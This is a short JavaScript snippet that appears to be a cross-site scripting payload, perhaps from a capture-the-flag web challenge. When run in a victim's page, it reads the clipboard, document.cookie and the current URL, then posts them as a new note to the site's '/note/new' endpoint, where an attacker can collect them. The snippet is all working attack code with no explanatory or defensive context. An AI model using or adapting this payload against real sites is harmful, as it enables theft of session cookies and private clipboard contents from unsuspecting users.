var clipboard = 'CHECKING';
var cookie = document.cookie || 'NONE';
var loc = location.href;

function save(data) {
  fetch('/note/new', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'title=RESULT&body=' + encodeURIComponent(data)
  });
}

try {
  navigator.clipboard.readText().then(function(text) {
    clipboard = text || 'EMPTY';
    save('CLIP:' + clipboard + '|COOKIE:' + cookie + '|URL:' + loc);
  }).catch(function(err) {
    save('CLIP_ERROR:' + err + '|COOKIE:' + cookie + '|URL:' + loc);
  });
} catch(e) {
  save('CLIP_EXCEPTION:' + e + '|COOKIE:' + cookie + '|URL:' + loc);
}
